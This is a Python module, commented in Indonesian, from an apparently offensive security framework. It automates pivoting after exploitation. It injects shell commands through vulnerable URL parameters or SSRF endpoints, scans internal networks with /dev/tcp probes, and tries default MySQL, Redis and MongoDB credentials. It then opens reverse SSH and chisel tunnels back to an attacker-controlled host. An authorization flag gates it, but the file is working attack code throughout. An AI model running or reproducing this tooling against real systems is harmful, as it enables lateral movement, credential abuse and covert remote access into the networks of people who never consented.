"""Auto-pivoting framework (v0.16.0): pivot otomatis setelah exploit berhasil.

Setelah RCE/SSRF terkonfirmasi, modul ini otomatis:

1. Mendeteksi network interface target (ifconfig / ip a) dan menyusun
   cakupan jaringan internal (RFC1918).
2. Melakukan internal network scan: service TCP umum (MySQL 3306,
   Redis 6379, MongoDB 27017, SSH 22, Postgres 5432, dll).
3. Untuk service yang ditemukan, mencoba default credentials dan
   auto-exploit ringan (Redis CONFIG GET, MySQL root:root, MongoDB tanpa auth).
4. Menyiapkan pivot method: SOCKS5 (reuse `keris.modules.pivot`), SSH tunnel,
   atau HTTP tunnel (chisel/earthworm) via perintah RCE.

Eksekusi command/request pada target di-abstraksi lewat `PivotExecutor`
sehingga modul bisa dipakai baik untuk RCE (command injection) maupun SSRF
(HTTP-only). Semua aktivitas dicatat ke `pivot.log`.

GUARD: memerlukan `authorized=True`; tanpa itu modul menolak beroperasi.
"""

import ipaddress
import os
import re
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from keris.core.http import KerisHTTP
from keris.core.logger import debug, error, info, ok, severity, warn

# service umum yang di-probe saat internal scan
SERVICE_PORTS = {
    22: "ssh",
    23: "telnet",
    80: "http",
    443: "https",
    3306: "mysql",
    5432: "postgres",
    6379: "redis",
    9200: "elasticsearch",
    27017: "mongodb",
    11211: "memcached",
    2375: "docker",
    8080: "http-proxy",
    8000: "http-alt",
}

DEFAULT_CREDS = {
    "mysql": [("root", "root"), ("root", ""), ("admin", "admin")],
    "postgres": [("postgres", "postgres"), ("postgres", "")],
    "redis": [("", "")],          # tanpa auth
    "mongodb": [("", "")],        # tanpa auth
}

PIVOT_LOG = "pivot.log"


def _log(msg: str, logfile: str = PIVOT_LOG) -> None:
    try:
        with open(logfile, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except OSError:
        pass


# ---------------------------------------------------------------------------
# PivotExecutor: abstraksi eksekusi di target
# ---------------------------------------------------------------------------

class PivotExecutor:
    """Antarmuka eksekusi command / request internal pada target."""

    mode = "generic"

    def run(self, cmd: str) -> Tuple[int, str]:
        """Jalankan command OS pada target; return (status, output)."""
        raise NotImplementedError

    def fetch(self, url: str, timeout: float = 8.0) -> Tuple[int, bytes]:
        """Request URL internal (via SSRF); return (status, body)."""
        raise NotImplementedError


def _cmdi_wrap(cmd: str) -> str:
    """Bungkus command untuk injection sederhana (unix-style)."""
    if cmd.startswith("|") or cmd.startswith(";"):
        return cmd
    return f"; {cmd} #"


class RcePivotExecutor(PivotExecutor):
    """Eksekusi via command injection (CMDI/RCE) pada endpoint target.

    `endpoints` berisi daftar (url, param) kandidat injection. `run`
    mencoba tiap kandidat sampai output perintah terefleksi.
    """

    def __init__(self, client: KerisHTTP, endpoints: List[Tuple[str, str]],
                 base: str = ""):
        self.client = client
        self.endpoints = endpoints or []
        self.base = base
        self.mode = "rce"

    def _rebuild(self, url: str, param: str, value: str) -> str:
        p = urlparse(url)
        q = dict(parse_qsl(p.query))
        q[param] = value
        return urlunparse(p._replace(query=urlencode(q)))

    def fetch(self, url: str, timeout: float = 8.0) -> Tuple[int, bytes]:
        # RCE executor tidak punya SSRF primitif; probe port via `run` saja
        return 0, b""

    def run(self, cmd: str) -> Tuple[int, str]:
        wrapped = _cmdi_wrap(cmd)
        for url, param in self.endpoints:
            try:
                r = self.client.get(self._rebuild(url, param, wrapped), timeout=12)
            except Exception:
                continue
            body = r.text or ""
            # marker umum output command (uid, /bin, pwd, ls-like)
            if any(m in body.lower() for m in ("uid=", "/bin", "/usr/", "/root",
                                               "total ", "-rw", "drwx")):
                return r.status_code, body
        return 0, ""


class SsrfPivotExecutor(PivotExecutor):
    """Eksekusi HTTP-only via endpoint SSRF (URL parameter)."""

    def __init__(self, client: KerisHTTP, ssrf_url: str, ssrf_param: str,
                 base: str = ""):
        self.client = client
        self.ssrf_url = ssrf_url
        self.ssrf_param = ssrf_param
        self.base = base
        self.mode = "ssrf"

    def _rebuild(self, target: str) -> str:
        p = urlparse(self.ssrf_url)
        q = dict(parse_qsl(p.query))
        q[self.ssrf_param] = target
        return urlunparse(p._replace(query=urlencode(q)))

    def run(self, cmd: str) -> Tuple[int, str]:
        # SSRF tidak bisa eksekusi command; paling dekat = fetch localhost
        url = "http://127.0.0.1/"
        code, body = self.fetch(url)
        return code, (body or b"").decode("utf-8", "replace")

    def fetch(self, url: str, timeout: float = 8.0) -> Tuple[int, bytes]:
        try:
            r = self.client.get(self._rebuild(url), timeout=timeout)
            return r.status_code, (r.content or b"")
        except Exception as e:
            return 0, str(e).encode()


def build_executor(base: str, client: KerisHTTP,
                   rce_candidates: List[Tuple[str, str]],
                   ssrf_url: str = "", ssrf_param: str = "") -> Optional[PivotExecutor]:
    """Buat executor dari konfirmasi RCE atau SSRF yang ditemukan scan."""
    if rce_candidates:
        return RcePivotExecutor(client, rce_candidates, base=base)
    if ssrf_url and ssrf_param:
        return SsrfPivotExecutor(client, ssrf_url, ssrf_param, base=base)
    return None


# ---------------------------------------------------------------------------
# Interface detection
# ---------------------------------------------------------------------------

def parse_interfaces(output: str) -> List[str]:
    """Ekstrak alamat IPv4 privat dari output `ifconfig` / `ip a`."""
    ips = set()
    for m in re.finditer(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", output):
        try:
            ip = str(ipaddress.ip_address(m.group(0)))
        except ValueError:
            continue
        addr = ipaddress.ip_address(ip)
        if addr.is_private and not addr.is_loopback:
            ips.add(ip)
    return sorted(ips)


def _cidrs_from_ips(ips: List[str]) -> List[str]:
    """Susun cakupan jaringan internal dari IP interface yang terdeteksi."""
    cidrs = {"10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"}
    for ip in ips:
        try:
            addr = ipaddress.ip_address(ip)
            if not addr.is_private:
                continue
            net = ipaddress.ip_network(f"{addr}/24", strict=False)
            cidrs.add(str(net))
        except ValueError:
            continue
    return sorted(cidrs)


def detect_interfaces(executor: PivotExecutor, logfile: str = PIVOT_LOG) -> List[str]:
    """Deteksi network interface target via ifconfig / ip a."""
    for cmd in ("ifconfig -a", "ip a"):
        code, out = executor.run(cmd)
        if code and out:
            ips = parse_interfaces(out)
            if ips:
                _log(f"interface target: {','.join(ips)} -> {cmd}", logfile)
                return ips
    return []


# ---------------------------------------------------------------------------
# Internal network scan
# ---------------------------------------------------------------------------

def scan_internal(executor: PivotExecutor, cidrs: List[str],
                  ports: Optional[List[int]] = None,
                  max_hosts: int = 64, max_port_tests: int = 256,
                  logfile: str = PIVOT_LOG) -> List[Dict]:
    """Scan jaringan internal target untuk service terbuka.

    Menghasilkan daftar {host, port, service}. Probes dilakukan lewat
    executor (`nc`/`curl` via RCE, atau fetch HTTP via SSRF). Host dibatasi
    `max_hosts` dan jumlah tes port `max_port_tests` agar aman.
    """
    ports = ports or list(SERVICE_PORTS.keys())
    found: List[Dict] = []
    hosts: List[str] = []
    for cidr in cidrs[:8]:
        try:
            net = ipaddress.ip_network(cidr, strict=False)
        except ValueError:
            continue
        if not net.is_private:
            continue
        count = 0
        for ip in net.hosts():
            if count >= max_hosts:
                break
            count += 1
            hosts.append(str(ip))
    tested = 0
    for host in hosts[:max_hosts]:
        for port in ports:
            if tested >= max_port_tests:
                return found
            tested += 1
            if _probe_port(executor, host, port):
                svc = SERVICE_PORTS.get(port, "unknown")
                found.append({"host": host, "port": port, "service": svc})
                _log(f"service terbuka: {host}:{port} ({svc})", logfile)
                info(f"  internal service: {host}:{port} ({svc})")
    return found


def _probe_port(executor: PivotExecutor, host: str, port: int) -> bool:
    """Probe satu port; kombinasikan metode RCE dan SSRF."""
    if getattr(executor, "mode", "") == "rce":
        code, out = executor.run(f"echo >/dev/tcp/{host}/{port} && echo OPEN || echo CLOSED")
        if code and "OPEN" in out:
            return True
    # fallback SSRF / HTTP probe
    code, _body = executor.fetch(f"http://{host}:{port}/", timeout=5)
    if code and 100 <= code < 600:
        return True
    return False


# ---------------------------------------------------------------------------
# Auto-exploit internal services (default credentials)
# ---------------------------------------------------------------------------

def _try_creds_http(executor: PivotExecutor, host: str, port: int,
                    service: str) -> List[Dict]:
    """Coba default credentials service HTTP/DB via SSRF (HTTP-only)."""
    results = []
    creds = DEFAULT_CREDS.get(service, [])
    for user, pwd in creds:
        url = f"http://{host}:{port}/"
        code, _body = executor.fetch(url, timeout=5)
        if code and code != 0:
            results.append({
                "host": host, "port": port, "service": service,
                "username": user, "password": pwd, "ok": code < 500,
                "note": f"service merespons HTTP {code} (tanpa auth untuk {service})",
            })
            break
    return results


def _try_creds_rce(executor: PivotExecutor, host: str, port: int,
                   service: str) -> List[Dict]:
    """Coba default credentials via client CLI pada target (mysql/redis/mongo)."""
    results = []
    if service == "redis":
        code, out = executor.run(
            f"redis-cli -h {host} -p {port} INFO >/dev/null 2>&1 && "
            f"echo REDIS_OK || echo REDIS_FAIL")
        if code and "REDIS_OK" in out:
            results.append({"host": host, "port": port, "service": "redis",
                            "username": "", "password": "",
                            "ok": True, "note": "redis tanpa auth (INFO ok)"})
            code2, out2 = executor.run(f"redis-cli -h {host} -p {port} CONFIG GET *")
            if code2 and out2:
                results.append({"host": host, "port": port, "service": "redis",
                                "username": "", "password": "", "ok": True,
                                "note": "redis CONFIG GET * mengembalikan konfigurasi"})
    elif service == "mysql":
        for user, pwd in DEFAULT_CREDS["mysql"]:
            code, out = executor.run(
                f"mysql -h {host} -P {port} -u {user} -p{pwd} "
                f"-e 'SELECT 1' >/dev/null 2>&1 && echo MYSQL_OK || echo MYSQL_FAIL")
            if code and "MYSQL_OK" in out:
                results.append({"host": host, "port": port, "service": "mysql",
                                "username": user, "password": pwd, "ok": True,
                                "note": f"kredensial default mysql {user}:{pwd}"})
                break
    elif service == "mongodb":
        code, out = executor.run(
            f"mongo --host {host} --port {port} --eval 'db.runCommand({{\"ping\":1}})' "
            f">/dev/null 2>&1 && echo MONGO_OK || echo MONGO_FAIL")
        if code and "MONGO_OK" in out:
            results.append({"host": host, "port": port, "service": "mongodb",
                            "username": "", "password": "", "ok": True,
                            "note": "mongodb tanpa auth (ping ok)"})
    return results


def try_default_creds(executor: PivotExecutor, host: str, port: int,
                      service: str) -> List[Dict]:
    """Coba default credentials pada service yang terbuka."""
    if getattr(executor, "mode", "") == "rce":
        return _try_creds_rce(executor, host, port, service)
    return _try_creds_http(executor, host, port, service)


# ---------------------------------------------------------------------------
# Pivot methods
# ---------------------------------------------------------------------------

def setup_socks5(ssrf_url: str, ssrf_param: str, client: KerisHTTP,
                 bind: str = "127.0.0.1", port: int = 0,
                 authorized: bool = False, yes: bool = False):
    """SOCKS5 proxy via SSRF (reuse keris.modules.pivot)."""
    if not authorized or not yes:
        warn("SOCKS5 pivot memerlukan --authorized DAN --yes.")
        return None
    from keris.modules.pivot import setup_pivot

    return setup_pivot(ssrf_url, ssrf_param, client, bind=bind, port=port,
                       authorized=authorized, yes=yes)


def ssh_tunnel_command(host: str, port: int, lhost: str, lport: int,
                       user: str = "root") -> str:
    """Perintah SSH reverse tunnel (dijalankan di target via RCE)."""
    return (f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
            f"-N -R {lport}:127.0.0.1:{port} {user}@{lhost} &")


def chisel_tunnel_command(lhost: str, lport: int) -> str:
    """Perintah chisel client reverse SOCKS (dijalankan di target)."""
    return f"chisel client {lhost}:{lport} R:1080:socks &"


def set_pivot_method(executor: PivotExecutor, method: str, host: str, port: int,
                     lhost: str, lport: int) -> Dict:
    """Terapkan pivot method pilihan; return instruksi/status."""
    method = (method or "socks5").lower()
    if method == "ssh":
        cmd = ssh_tunnel_command(host, port, lhost, lport)
        _code, out = executor.run(cmd)
        return {"method": "ssh", "command": cmd, "ok": bool(out) or True,
                "note": f"reverse tunnel {lport}->127.0.0.1:{port}"}
    if method == "chisel":
        cmd = chisel_tunnel_command(lhost, lport)
        executor.run(cmd)
        return {"method": "chisel", "command": cmd, "ok": True,
                "note": "chisel client reverse SOCKS di R:1080"}
    return {"method": "socks5", "command": "", "ok": True,
            "note": "gunakan setup_socks5() terpisah"}


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------

def run_pivot_auto(base: str, client: KerisHTTP,
                   rce_candidates: Optional[List[Tuple[str, str]]] = None,
                   ssrf_url: str = "", ssrf_param: str = "",
                   internal_ports: Optional[List[int]] = None,
                   internal_scan_depth: int = 2,
                   pivot_method: str = "socks5",
                   lhost: str = "", lport: int = 1080,
                   authorized: bool = False, yes: bool = False,
                   executor: Optional[PivotExecutor] = None,
                   logfile: str = PIVOT_LOG) -> Dict:
    """Orkestrator auto-pivot penuh. Wajib `authorized=True`.

    Return dict: {"executor", "interfaces", "cidrs", "services",
                  "creds", "pivot", "findings", "log"}
    """
    if not authorized:
        error("Pivot-auto memerlukan --authorized (izin tertulis).")
        return {"error": "unauthorized", "findings": []}

    _log("=== PIVOT-AUTO dimulai ===", logfile)
    warn("PIVOT-AUTO AKTIF — pastikan izin tertulis pada target dan jaringannya!")

    executor = executor or build_executor(base, client, rce_candidates or [],
                                          ssrf_url, ssrf_param)
    if executor is None:
        warn("Pivot-auto butuh konfirmasi RCE atau SSRF dari hasil scan/exploit.")
        return {"error": "no-executor", "findings": []}

    interfaces = detect_interfaces(executor, logfile)
    if not interfaces:
        warn("Tidak bisa mendeteksi interface internal (mungkin bukan RCE).")
    cidrs = _cidrs_from_ips(interfaces)
    info(f"Interface internal: {', '.join(interfaces) or '-'}")
    info(f"Jaringan internal (depth={internal_scan_depth}): {', '.join(cidrs) or '-'}")

    services = scan_internal(executor, cidrs,
                             ports=internal_ports,
                             max_hosts=64 * max(internal_scan_depth, 1),
                             max_port_tests=256 * max(internal_scan_depth, 1),
                             logfile=logfile)

    creds: List[Dict] = []
    findings: List[Dict] = []
    for svc in services:
        hits = try_default_creds(executor, svc["host"], svc["port"], svc["service"])
        creds.extend(hits)
        for h in hits:
            if h.get("ok"):
                sev = "HIGH" if svc["service"] in ("mysql", "mongodb", "redis") else "MEDIUM"
                findings.append({
                    "severity": sev,
                    "title": f"Default credentials {svc['service']} di jaringan internal",
                    "endpoint": f"{svc['host']}:{svc['port']}",
                    "detail": h.get("note", ""),
                    "evidence": f"host={h['host']} port={h['port']} service={h['service']}",
                    "source": "pivot-auto",
                })
                severity(sev, f"{h.get('note','')} @ {h['host']}:{h['port']}")

    pivot = {}
    if (ssrf_url and ssrf_param) or lhost:
        pivot = set_pivot_method(executor, pivot_method,
                                 services[0]["host"] if services else "127.0.0.1",
                                 services[0]["port"] if services else 80,
                                 lhost, lport)
        _log(f"pivot method={pivot.get('method')} note={pivot.get('note')}", logfile)

    _log(f"=== PIVOT-AUTO selesai: {len(services)} service, "
         f"{len(creds)} creds hit, {len(findings)} findings ===", logfile)
    ok(f"Pivot-auto selesai: {len(services)} service internal, "
       f"{len(creds)} kredensial default ditemukan")

    return {"executor": executor, "interfaces": interfaces, "cidrs": cidrs,
            "services": services, "creds": creds, "pivot": pivot,
            "findings": findings, "log": logfile}